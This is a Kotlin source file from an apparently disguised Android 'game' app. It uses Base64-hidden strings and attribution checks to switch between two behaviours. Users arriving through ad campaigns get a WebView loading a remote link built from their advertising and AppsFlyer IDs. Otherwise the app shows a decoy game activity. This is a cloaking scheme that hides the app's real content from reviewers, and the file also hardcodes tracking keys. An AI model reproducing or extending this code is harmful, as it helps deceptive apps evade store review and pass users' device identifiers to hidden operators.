package com.bdleess.cyoowb.PPPA

import android.content.Context
import android.content.Intent
import android.util.Base64
import android.util.Log
import com.bdleess.cyoowb.*
import com.onesignal.OneSignal
import com.bdleess.cyoowb.DDAA.KeyGist
import com.bdleess.cyoowb.DDAA.link
import com.bdleess.cyoowb.GGG.STActivity
import kotlinx.coroutines.DelicateCoroutinesApi

var packageNameSD = "Y29tLnd0aXNsZWR3LnRlcnJldWFz"
var OneSignalID = "66bae02e-f070-41db-a574-729896d497c9"
var adverID: String? = null
var appsFlyerID: String? = null
var apDevKey: String = "a2dBbUpqQ0xIcE5ZWEtacjh2dVhIQw=="
var fbData: String? = null

@DelicateCoroutinesApi
class PAAPAPA {

    var staticKey: String? = null
    var teamName: String? = null
    var keyCompany: String? = null
    var sub2: String? = null
    var sub3: String? = null
    var sub4: String? = null
    var sub5: String? = null
    lateinit var campLucky: Array<String>

    fun ParseLine(parseline: String): String {
        campLucky = parseline.split("::").toTypedArray()

        try {
            staticKey = campLucky[0]
        } catch (e: Error) {
            staticKey = ""
        }
        try {
            teamName = campLucky[1]
        } catch (e: Error) {
            teamName = ""
        }

        try {
            keyCompany = campLucky[2]
        } catch (e: Error) {
            keyCompany = ""
        }
        try {
            sub2 = campLucky[3]
        } catch (e: Error) {
            sub2 = ""
        }
        try {
            sub3 = campLucky[4]
        } catch (e: Error) {
            sub3 = ""
        }
        try {
            sub4 = campLucky[5]
        } catch (e: Error) {
            sub4 = ""
        }
        try {
            sub5 = campLucky[6]
        } catch (e: Error) {
            sub5 = ""
        }

        OneSignal.sendTag(Decoder("c3ViX2FwcA=="), teamName)
        val AppsLineDecode =
            (staticKey + Decoder("P2J1bmRsZT0=") + Decoder(packageNameSD) + Decoder("JmFkX2lkPQ==") +
                    adverID + Decoder("JmFwcHNfaWQ9") +
                    appsFlyerID + Decoder("JmRldl9rZXk9") +
                   Decoder(apDevKey) + Decoder("JnN1YjY9") +
                    teamName + Decoder("JnN1Yjc9") + keyCompany +
                    Decoder("JnN1YjI9") + sub2 +
                    Decoder("JnN1YjM9") + sub3 +
                    Decoder("JnN1YjQ9") + sub4 +
                    Decoder("JnN1YjU9") + sub5)
        return AppsLineDecode
    }

    fun ParseLineOrg() {
        val param = KeyGist + Decoder("P2J1bmRsZT0=") + Decoder(packageNameSD) +
                Decoder("JmFkX2lkPQ==") + adverID + Decoder("JmFwcHNfaWQ9") +
                appsFlyerID + Decoder("JmRldl9rZXk9") + Decoder(apDevKey)
        val link = link + param
        wwb.startWEB(krop)
        krop.loadUrl(link)
        Log.e("TAG","LinkOrg: $link")
    }

    fun Decoder(str: String): String {
        val strdecode = String(Base64.decode(str, Base64.DEFAULT))
        return strdecode
    }

    fun startTest(context: Context) {
        Log.e("TAG","STSTST: ${apps_static}")
        if (apps_static.equals(Decoder("Tm9uLW9yZ2FuaWM="))) {
            val link = link + parametr
            wwb.startWEB(krop)
            krop.loadUrl(link)
            Log.e("TAG", "APPS: $link")
        } else if (fbData != null) {
            val link = link + fbData
            wwb.startWEB(krop)
            krop.loadUrl(link)
            Log.e("TAG", "DEEPLINK: $link")
        } else {
            if (KeyGist == Decoder("Tk8=")) {
                val intent = Intent(context, STActivity::class.java)
                context.startActivity(intent)
                Log.e("TAG","KeyNO:Game")
            } else {
                ParseLineOrg()
            }
        }

    }


}